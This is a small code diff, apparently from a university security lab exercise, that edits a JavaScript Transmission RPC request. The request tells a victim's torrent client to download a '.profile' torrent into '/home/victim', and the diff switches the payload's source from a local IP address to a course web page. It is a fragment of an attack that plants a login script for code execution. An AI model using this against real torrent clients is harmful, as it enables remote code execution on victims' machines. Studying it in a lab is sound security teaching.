@@ -13,7 +13,7 @@ var startDownload = {
 	method: "torrent-add",
 	arguments: {
 		"download-dir": "/home/victim",
-		filename: "http://10.0.2.30/.profile.torrent",
+		filename: "http://www2.macs.hw.ac.uk/~cg23/F20AN/.profile.torrent",
 		paused: false
 	}
 };
